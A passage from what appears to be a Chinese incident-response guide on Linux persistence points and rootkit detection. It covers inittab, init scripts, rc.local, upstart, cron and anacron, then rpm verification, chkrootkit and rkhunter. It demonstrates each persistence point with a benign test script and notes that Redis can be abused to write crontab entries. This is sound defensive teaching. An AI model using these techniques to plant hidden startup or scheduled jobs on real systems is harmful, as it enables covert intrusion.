lrwxrwxrwx&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;16&nbsp;Jul&nbsp;20&nbsp;14:00&nbsp;K88auditd&nbsp;-&gt;&nbsp;../init.d/auditd</pre>
<p style="text-align: left;">另外说明一下应急响应中我们都会检查/etc/rc.local，其实也是在rcN.d中。<br style="outline: none;"/>/etc/rc.local是软链到了/etc/rc.d/rc.local</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;init.d]#&nbsp;ll&nbsp;/etc/rc.local
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;13&nbsp;Jul&nbsp;13&nbsp;15:03&nbsp;/etc/rc.local&nbsp;-&gt;&nbsp;rc.d/rc.local</pre>
<p style="text-align: left;">Redhat中的运行模式2、3、5都把/etc/rc.d/rc.local做为初始化脚本中的最后一个</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;rc3.d]#&nbsp;ll&nbsp;/etc/rc.d/rc3.d/S99local&nbsp;
lrwxrwxrwx.&nbsp;1&nbsp;root&nbsp;root&nbsp;11&nbsp;Jul&nbsp;13&nbsp;15:03&nbsp;/etc/rc.d/rc3.d/S99local&nbsp;-&gt;&nbsp;../rc.local</pre>
<pre class="brush:html;toolbar:false;">1:2345:respawn:/sbin/mingetty&nbsp;tty1
2:2345:respawn:/sbin/mingetty&nbsp;tty2
3:2345:respawn:/sbin/mingetty&nbsp;tty3
4:2345:respawn:/sbin/mingetty&nbsp;tty4
5:2345:respawn:/sbin/mingetty&nbsp;tty5
6:2345:respawn:/sbin/mingetty&nbsp;tty6</pre>
<p style="text-align: left;">init接下来会打开6个终端，以便用户登录系统。</p>
<p style="text-align: left;">总结一下，针对CentOS5系统，需要排查的点：<br style="outline: none;"/>1）/etc/inittab<br style="outline: none;"/>该文件是可以运行process的，这里我们添加一行</p>
<p style="text-align: left;">&gt; 0:235:once:/bin/vinc</p>
<p style="text-align: left;">内容如下</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;~]#&nbsp;cat&nbsp;/bin/vinc&nbsp;
#!/bin/bash
cat&nbsp;/etc/issue&nbsp;&gt;&nbsp;/tmp/version</pre>
<p style="text-align: left;">重启</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;~]#&nbsp;cat&nbsp;/tmp/version&nbsp;
CentOS&nbsp;release&nbsp;5.5&nbsp;(Final)
Kernel&nbsp;r&nbsp;on&nbsp;an&nbsp;m</pre>
<p style="text-align: left;">2）/etc/rc.d/rc.sysinit<br style="outline: none;"/>在最后插入一行/bin/vinc</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;~]#&nbsp;ll&nbsp;/tmp/version&nbsp;
-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;47&nbsp;11-05&nbsp;10:10&nbsp;/tmp/version</pre>
<p style="text-align: left;">3）/etc/rc.d/init.d<br style="outline: none;"/>4）/etc/rc.d/rc.local</p>
<p style="text-align: left;">CentOS 6：<br style="outline: none;"/>init会读取配置文件/etc/inittab 和 /etc/init/*.conf。先看一下/etc/inittab</p>
<pre class="brush:html;toolbar:false;">[root@server120&nbsp;src]#&nbsp;cat&nbsp;/etc/inittab
#&nbsp;inittab&nbsp;is&nbsp;only&nbsp;used&nbsp;by&nbsp;upstart&nbsp;for&nbsp;the&nbsp;default&nbsp;runlevel.
#
#&nbsp;ADDING&nbsp;OTHER&nbsp;CONFIGURATION&nbsp;HERE&nbsp;WILL&nbsp;HAVE&nbsp;NO&nbsp;EFFECT&nbsp;ON&nbsp;YOUR&nbsp;SYSTEM.
#
#&nbsp;System&nbsp;initialization&nbsp;is&nbsp;started&nbsp;by&nbsp;/etc/init/rcS.conf
#
#&nbsp;Individual&nbsp;runlevels&nbsp;are&nbsp;started&nbsp;by&nbsp;/etc/init/rc.conf
#
#&nbsp;Ctrl-Alt-Delete&nbsp;is&nbsp;handled&nbsp;by&nbsp;/etc/init/control-alt-delete.conf
#
#&nbsp;Terminal&nbsp;gettys&nbsp;are&nbsp;handled&nbsp;by&nbsp;/etc/init/tty.conf&nbsp;and&nbsp;/etc/init/serial.conf,
#&nbsp;with&nbsp;configuration&nbsp;in&nbsp;/etc/sysconfig/init.
#
#&nbsp;For&nbsp;information&nbsp;on&nbsp;how&nbsp;to&nbsp;write&nbsp;upstart&nbsp;event&nbsp;handlers,&nbsp;or&nbsp;how
#&nbsp;upstart&nbsp;works,&nbsp;see&nbsp;init(5),&nbsp;init(8),&nbsp;and&nbsp;initctl(8).
#
#&nbsp;Default&nbsp;runlevel.&nbsp;The&nbsp;runlevels&nbsp;used&nbsp;are:
#&nbsp;&nbsp;&nbsp;0&nbsp;-&nbsp;halt&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;&nbsp;&nbsp;1&nbsp;-&nbsp;Single&nbsp;user&nbsp;mode
#&nbsp;&nbsp;&nbsp;2&nbsp;-&nbsp;Multiuser,&nbsp;without&nbsp;NFS&nbsp;(The&nbsp;same&nbsp;as&nbsp;3,&nbsp;if&nbsp;you&nbsp;do&nbsp;not&nbsp;have&nbsp;networking)
#&nbsp;&nbsp;&nbsp;3&nbsp;-&nbsp;Full&nbsp;multiuser&nbsp;mode
#&nbsp;&nbsp;&nbsp;4&nbsp;-&nbsp;unused
#&nbsp;&nbsp;&nbsp;5&nbsp;-&nbsp;X11
#&nbsp;&nbsp;&nbsp;6&nbsp;-&nbsp;reboot&nbsp;(Do&nbsp;NOT&nbsp;set&nbsp;initdefault&nbsp;to&nbsp;this)
#&nbsp;
id:3:initdefault:</pre>
<p style="text-align: left;">通过注释可以看到，upstart只使用inittab读取默认的runlevel。添加其他的配置都不会生效，其他的配置都移动到了/etc/init/*.conf下。<br style="outline: none;"/>系统初始化/etc/init/rcS.conf<br style="outline: none;"/>对应runlevel的服务启动/etc/init/rc.conf<br style="outline: none;"/>终端配置/etc/init/tty.conf<br style="outline: none;"/>&#8230;.</p>
<p style="text-align: left;">总结一下，针对CentOS6系统，需要排查的点：<br style="outline: none;"/>1）/etc/init/*.conf<br style="outline: none;"/>vim tty.conf，添加一行</p>
<p style="text-align: left;">&gt; exec /bin/vinc</p>
<p style="text-align: left;">内容如下:</p>
<pre class="brush:html;toolbar:false;">[root@vincenthostname&nbsp;init]#&nbsp;cat&nbsp;/bin/vinc&nbsp;
#!/bin/bash
touch&nbsp;/tmp/vinc</pre>
<p style="text-align: left;">重启</p>
<pre class="brush:html;toolbar:false;">[root@vincenthostname&nbsp;~]#&nbsp;ll&nbsp;/tmp/vinc
-rw-r--r--&nbsp;1&nbsp;root&nbsp;root&nbsp;0&nbsp;6月&nbsp;&nbsp;22&nbsp;15:07&nbsp;/tmp/vinc</pre>
<p style="text-align: left;">2）/etc/rc.d/rc.sysinit<br style="outline: none;"/>3）/etc/rc.d/init.d<br style="outline: none;"/>4）/etc/rc.d/rc.local</p>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x08 定时任务</strong></span></p>
<p style="text-align: left;">在应急响应中，最重要的一个点就是定时任务，例如Redis未授权通过持久化配置写入Crontab中。下面梳理一下定时任务相关的知识点：<br style="outline: none;"/>一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。<br style="outline: none;"/>而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。<br style="outline: none;"/>另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。例如我想每天执行一个脚本，只需要放到/etc/cron.daily下，并且赋予执行权限即可。<br style="outline: none;"/>那这些目录下的任务是怎么调用的？这里CentOS5和CentOS6还是有区别的。</p>
<p style="text-align: left;">CentOS5中：</p>
<pre class="brush:html;toolbar:false;">[root@jianshe_28&nbsp;/]#&nbsp;cat&nbsp;/etc/issue
CentOS&nbsp;release&nbsp;5.8&nbsp;(Final)
Kernel&nbsp;r&nbsp;on&nbsp;an&nbsp;m
[root@jianshe_28&nbsp;/]#&nbsp;cat&nbsp;/etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
#&nbsp;run-parts
01&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.hourly
02&nbsp;4&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.daily
22&nbsp;4&nbsp;*&nbsp;*&nbsp;0&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.weekly
42&nbsp;4&nbsp;1&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.monthly</pre>
<p style="text-align: left;">run-parts命令位于/usr/bin/run-parts，内容是很简单的一个shell脚本，就是遍历目标文件夹，执行第一层目录下的可执行权限的文件。<br style="outline: none;"/>所以在CentOS5下是实际是通过/etc/crontab来运行/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly下面的脚本的。<br style="outline: none;"/>这里我们注意到在/etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly下都有一个脚本0anacron</p>
<pre class="brush:html;toolbar:false;">[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.daily/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.daily
fi
[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.weekly/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.weekly
fi
[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.monthly/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.monthly
fi</pre>
<p style="text-align: left;">这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？<br style="outline: none;"/>anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。所以 anacron 并不能指定何时运行某项任务， 而是以天为单位或者是在启动后立刻进行 anacron 的动作，他会去检查停机期间应该进行但是并没有进行的 crontab 任务，并将该任务运行一遍后，anacron 就会自动停止了。<br style="outline: none;"/>anacron的配置文件是/etc/anacrontab</p>
<pre class="brush:html;toolbar:false;">[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/anacrontab&nbsp;
#&nbsp;/etc/anacrontab:&nbsp;configuration&nbsp;file&nbsp;for&nbsp;anacron
#&nbsp;See&nbsp;anacron(8)&nbsp;and&nbsp;anacrontab(5)&nbsp;for&nbsp;details.
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
1&nbsp;&nbsp;&nbsp;&nbsp;65&nbsp;&nbsp;&nbsp;&nbsp;cron.daily&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.daily
7&nbsp;&nbsp;&nbsp;&nbsp;70&nbsp;&nbsp;&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.weekly
30&nbsp;&nbsp;&nbsp;&nbsp;75&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.monthly</pre>
<p style="text-align: left;">具体含义如下：</p>
<p style="text-align: center;"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20171010/1507617180112987.png" title="1507617180112987.png" alt="1.png"/><noscript><img src="/uploads/20171010/1507617180112987.png" title="1507617180112987.png" alt="1.png"/></noscript></p>
<p style="text-align: left;">第一部分是轮回天数，即是指任务在多少天内执行一次，monthly 就是一个月（30天）内执行，weekly 即是在一周之内执行一次。</p>
<p style="text-align: left;">第二部分 delay 是指轮回内的重试时间，这个意思有两部分，一个是 anacron 启动以后该服务 ready 暂不运行的时间（周任务的 70 delay 在 anacron 启动后70分钟内不执行，而处于 ready 状态），另一个是指如果该任务到达运行时间后却因为某种原因没有执行（比如前一个服务还没有运行完成，anacron 在 /etc/init.d 的脚本中加了一个 -s 参数，便是指在前一个任务没有完成时不执行下一个任务），依然以周任务和月任务为例，周任务在启动 anacron 后的&nbsp;&nbsp;70 分钟执行，月任务在服务启动后 75 分钟执行，但是，如果月任务到达服务启动后 75 分钟，可是周任务运行超过5分钟依然没有完成，那月任务将会进入下一个 75 分钟的轮回，在下一个 75 分钟时再检查周任务是否完成，如果前一个任务完成了那月任务开始运行。</p>
<p style="text-align: left;">第三部分 job-identifier ，anacron 每次启动时都会在 /var/spool/anacron 里面建立一个以 job-identifier 为文件名的文件，里面记录着任务完成的时间，如果任务是第一次运行的话那这个文件应该是空的。anacron运行时，会去检查“/var/spool/anacron/这部分”文件中的内容，内容为一个日期，如下：</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/var/spool/anacron/cron.
cron.daily&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/var/spool/anacron/cron.*
20170719
20170713
20170713</pre>
<p style="text-align: left;">根据这个日期判断下面的第四部分要不要执行。 比如说这里写的是cron.daily，然后/var/spool/anacron/cron.daily文件中记录的日期为昨天的话，那anancron执行后就行执行这一行对应第四行的动作。</p>
<p style="text-align: left;">第四部分最为简单，仅仅是你想运行的命令</p>
<p style="text-align: left;">/usr/sbin/anacron常用参数：</p>
<pre class="brush:html;toolbar:false;">-s&nbsp;&nbsp;：开始连续的运行各项工作&nbsp;(job)，会依据时间记录档的数据判断是否进行；
-f&nbsp;&nbsp;：强制进行，而不去判断时间记录档的时间戳记；
-n&nbsp;&nbsp;：立刻进行未进行的任务，而不延迟&nbsp;(delay)&nbsp;等待时间；
-u&nbsp;&nbsp;：仅升级时间记录档的时间戳记，不进行任何工作。</pre>
<p style="text-align: left;">所以在CentOS5中已经通过/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly已经通过/etc/crontab配置执行了，所以这里只是通过anacron -u来记录了执行的时间。</p>
<p style="text-align: left;">CentOS6中：</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/issue
CentOS&nbsp;release&nbsp;6.5&nbsp;(Final)
Kernel&nbsp;r&nbsp;on&nbsp;an&nbsp;m
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
#&nbsp;For&nbsp;details&nbsp;see&nbsp;man&nbsp;4&nbsp;crontabs
#&nbsp;Example&nbsp;of&nbsp;job&nbsp;definition:
#&nbsp;.----------------&nbsp;minute&nbsp;(0&nbsp;-&nbsp;59)
#&nbsp;|&nbsp;&nbsp;.-------------&nbsp;hour&nbsp;(0&nbsp;-&nbsp;23)
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.----------&nbsp;day&nbsp;of&nbsp;month&nbsp;(1&nbsp;-&nbsp;31)
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.-------&nbsp;month&nbsp;(1&nbsp;-&nbsp;12)&nbsp;OR&nbsp;jan,feb,mar,apr&nbsp;...
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.----&nbsp;day&nbsp;of&nbsp;week&nbsp;(0&nbsp;-&nbsp;6)&nbsp;(Sunday=0&nbsp;or&nbsp;7)&nbsp;OR&nbsp;sun,mon,tue,wed,thu,fri,sat
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|
#&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;user-name&nbsp;command&nbsp;to&nbsp;be&nbsp;executed</pre>
<p style="text-align: left;">可以看到默认的/etc/crontab为空了。那么/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly下面的任务是怎么执行的？<br style="outline: none;"/>我们再仔细看一下，注意到CentOS5下的/etc/cron.d目录为空。</p>
<pre class="brush:html;toolbar:false;">[root@jianshe_28&nbsp;cron.daily]#&nbsp;ll&nbsp;/etc/cron.d
total&nbsp;0</pre>
<p style="text-align: left;">而CentOS6下有一个0hourly</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;ll&nbsp;/etc/cron.d
total&nbsp;12
-rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;113&nbsp;Jul&nbsp;18&nbsp;19:36&nbsp;0hourly</pre>
<p style="text-align: left;">看一下执行的任务</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/cron.d/0hourly&nbsp;
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
01&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.hourly</pre>
<p style="text-align: left;">然后看一下/etc/cron.hourly所执行的脚本</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;ll&nbsp;/etc/cron.hourly
total&nbsp;4
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;409&nbsp;Jul&nbsp;18&nbsp;14:20&nbsp;0anacron
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/cron.hourly/0anacron&nbsp;
#!/bin/bash
#&nbsp;Skip&nbsp;excecution&nbsp;unless&nbsp;the&nbsp;date&nbsp;has&nbsp;changed&nbsp;from&nbsp;the&nbsp;previous&nbsp;run&nbsp;
if&nbsp;test&nbsp;-r&nbsp;/var/spool/anacron/cron.daily;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;day=`cat&nbsp;/var/spool/anacron/cron.daily`
fi
if&nbsp;[&nbsp;`date&nbsp;+%Y%m%d`&nbsp;=&nbsp;&quot;$day&quot;&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;
fi
#&nbsp;Skip&nbsp;excecution&nbsp;unless&nbsp;AC&nbsp;powered
if&nbsp;test&nbsp;-x&nbsp;/usr/bin/on_ac_power;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;/usr/bin/on_ac_power&nbsp;&amp;&gt;&nbsp;/dev/null
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;test&nbsp;$?&nbsp;-eq&nbsp;1;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;fi
fi
/usr/sbin/anacron&nbsp;-s</pre>
<p style="text-align: left;">然后看一下/etc/anacrontab的内容</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/anacrontab&nbsp;
#&nbsp;/etc/anacrontab:&nbsp;configuration&nbsp;file&nbsp;for&nbsp;anacron
#&nbsp;See&nbsp;anacron(8)&nbsp;and&nbsp;anacrontab(5)&nbsp;for&nbsp;details.
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
#&nbsp;the&nbsp;maximal&nbsp;random&nbsp;delay&nbsp;added&nbsp;to&nbsp;the&nbsp;base&nbsp;delay&nbsp;of&nbsp;the&nbsp;jobs
RANDOM_DELAY=45
#&nbsp;the&nbsp;jobs&nbsp;will&nbsp;be&nbsp;started&nbsp;during&nbsp;the&nbsp;following&nbsp;hours&nbsp;only
START_HOURS_RANGE=3-22
#period&nbsp;in&nbsp;days&nbsp;&nbsp;&nbsp;delay&nbsp;in&nbsp;minutes&nbsp;&nbsp;&nbsp;job-identifier&nbsp;&nbsp;&nbsp;command
1&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;cron.daily&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.daily
7&nbsp;&nbsp;&nbsp;&nbsp;25&nbsp;&nbsp;&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.weekly
@monthly&nbsp;45&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.monthly</pre>
<p style="text-align: left;">这里多了两条配置<br style="outline: none;"/>RANDOM_DELAY=45<br style="outline: none;"/>表示定时触发后随机延迟45分钟以内的时间再启动应用<br style="outline: none;"/>START_HOURS_RANGE=3-22<br style="outline: none;"/>表示程序在3时至22时之间会启动</p>
<p style="text-align: left;">看到这里我们就明白了在CeontOS6 里面，crond会检查/etc/cron.d里面的配置，里面有一个0hourly文件，每小时去运行一次/etc/cron.hourly目录，该目录下面有一个0anacron文件，这样0anacron文件就能每小时运行一次，这里其实执行的是/usr/sbin/anacron -s。anacron读取配置文件/etc/anacrontab，将当前时间与/var/spool/anacron目录下面的文件里面的时间戳作对比，如果需要则去运行/etc/anacrontab对应的条目。</p>
<p style="text-align: left;"><strong>总结：</strong></p>
<p style="text-align: left;">应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。<br style="outline: none;"/>其中容易忽视的就是/etc/anacrontab<br style="outline: none;"/>在CentOS6下我们做个测试：<br style="outline: none;"/>编辑/etc/anacrontab<br style="outline: none;"/>修改RANDOM_DELAY=1<br style="outline: none;"/>添加1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cron.test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 1 &gt;&gt; /tmp/1.txt<br style="outline: none;"/>[root@localhost cron.weekly]# /usr/sbin/anacron -s<br style="outline: none;"/>等待一分多钟后，可以看到</p>
<pre class="brush:html;toolbar:false;">[root@localhost&nbsp;cron.weekly]#&nbsp;cat&nbsp;/var/spool/anacron/cron.test&nbsp;
20170719
[root@localhost&nbsp;cron.weekly]#&nbsp;cat&nbsp;/tmp/1.txt&nbsp;
1</pre>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x09 Rootkit</strong></span></p>
<p style="text-align: left;">检查命令替换<br style="outline: none;"/>1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。<br style="outline: none;"/>例如我替换一下/bin/ps，然后使用rpm -qaV查看</p>
<pre class="brush:html;toolbar:false;">[root@vincenthostname&nbsp;tmp]#&nbsp;rpm&nbsp;-qaV
S.?....T.&nbsp;/bin/ps</pre>
<p style="text-align: left;">2）比对命令的大小<br style="outline: none;"/>例如正常的ps和netstat大小</p>
<pre class="brush:html;toolbar:false;">[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;/bin/ps
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;87112&nbsp;11月&nbsp;15&nbsp;2012&nbsp;/bin/ps
[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;/bin/netstat
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;128216&nbsp;5月&nbsp;10&nbsp;2012&nbsp;/bin/netstat</pre>
<p style="text-align: left;">下面是其中有一次应急时的记录</p>
<pre class="brush:html;toolbar:false;">[root@DataNode110&nbsp;admin]#&nbsp;ls&nbsp;-alt&nbsp;/bin/&nbsp;|&nbsp;head&nbsp;-n&nbsp;10
total&nbsp;10836
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;625633&nbsp;Aug&nbsp;17&nbsp;16:26&nbsp;tawlqkazpu
dr-xr-xr-x.&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Aug&nbsp;17&nbsp;16:26&nbsp;.
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;1223123&nbsp;Aug&nbsp;17&nbsp;11:30&nbsp;ps
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;1223123&nbsp;Aug&nbsp;17&nbsp;11:30&nbsp;netstat</pre>
<p style="text-align: left;">可以看到ps和netstat是一样大的。<br style="outline: none;"/>3）查看命令的修改时间，按修改时间排序</p>
<pre class="brush:html;toolbar:false;">ls&nbsp;-alt&nbsp;/bin/&nbsp;|&nbsp;head&nbsp;-n&nbsp;5</pre>
<p style="text-align: left;">4）使用chkrootkit和rkhunter查看</p>
<p style="text-align: left;">chkrootkit</p>
<p style="text-align: left;">1、准备gcc编译环境<br style="outline: none;"/>对于CentOS系统，执行下述三条命令：</p>
<p style="text-align: left;">&gt; yum -y install gcc gcc-c++ make glibc*</p>
<p style="text-align: left;">2、下载chkrootkit源码</p>
<p style="text-align: left;">chkrootkit的官方网站为&nbsp;<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a>&nbsp;，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：</p>
<p style="text-align: left;">&gt; [root@www ~]# wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</p>
<p style="text-align: left;">3、解压下载回来的安装包</p>
<p style="text-align: left;">&gt; [root@www ~]# tar zxf chkrootkit.tar.gz</p>
<p style="text-align: left;">4、编译安装（后文命令中出现的“*”无需替换成具体字符，原样复制执行即可）</p>
<p style="text-align: left;">&gt;[root@www ~]# cd chkrootkit-*<br style="outline: none;"/>&gt;<br style="outline: none;"/>&gt;[root@www ~]# make sense</p>
<p style="text-align: left;">注意，上面的编译命令为make sense。</p>
<p style="text-align: left;">5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件</p>
<p style="text-align: left;">&gt;[root@www ~]# cd ..<br style="outline: none;"/>&gt;[root@www ~]# cp -r chkrootkit-&nbsp;/usr/local/chkrootkit<br style="outline: none;"/>&gt;[root@www ~]# rm -r chkrootkit-</p>
<p style="text-align: left;">至此，安装完毕。</p>
<p style="text-align: left;">使用方法<br style="outline: none;"/>安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit<br style="outline: none;"/>直接执行</p>
<p style="text-align: left;">&gt; root@vm:~# /usr/local/chkrootkit/chkrootkit</p>
<p style="text-align: left;">rkhunter</p>
<p style="text-align: left;">在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。</p>
<p style="text-align: left;">下载地址：&nbsp;<a href="http://sourceforge.net/projects/rkhunter/files/" target="_blank" textvalue="http://sourceforge.net/projects/rkhunter/files/">http://sourceforge.net/projects/rkhunter/files/</a></p>
<p style="text-align: left;">1）安装</p>
<pre class="brush:html;toolbar:false;">tar&nbsp;-xvf&nbsp;rkhunter-1.4.0.tar.gz
cd&nbsp;rkhunter-1.4.0
./installer.sh&nbsp;–install</pre>
<p style="text-align: left;">在安装了kbeast的系统上测试，可以成功检测到。</p>
<pre class="brush:html;toolbar:false;">/usr/local/bin/rkhunter&nbsp;–check&nbsp;-sk
[19:50:27]&nbsp;Rootkit&nbsp;checks…
[19:50:27]&nbsp;Rootkits&nbsp;checked&nbsp;:&nbsp;389
[19:50:27]&nbsp;Possible&nbsp;rootkits:&nbsp;1
[19:50:27]&nbsp;Rootkit&nbsp;names&nbsp;:&nbsp;KBeast&nbsp;Rootkit</pre>
<p style="text-align: left;">2）在线升级<br style="outline: none;"/>rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:<br style="outline: none;"/>执行命令：</p>
<p style="text-align: left;">&gt; rkhunter –update</p>
<p style="text-align: left;">3）检测最新版本<br style="outline: none;"/>让 rkhunter 保持在最新的版本；<br style="outline: none;"/>执行命令：</p>
<p style="text-align: left;">&gt; rkhunter –versioncheck</p>
<p style="text-align: left;"><span style="color: rgb(227, 108, 9);"><strong>0x10 病毒检测</strong></span></p>
<pre class="brush:html;toolbar:false;">https://x.threatbook.cn/
http://www.virscan.org
https://www.virustotal.com/
https://fireeye.ijinshan.com/</pre>
<p><span style="color: rgb(227, 108, 9);"><strong>0x11 文件权限</strong></span></p>
<p>setfacl与getfacl</p>
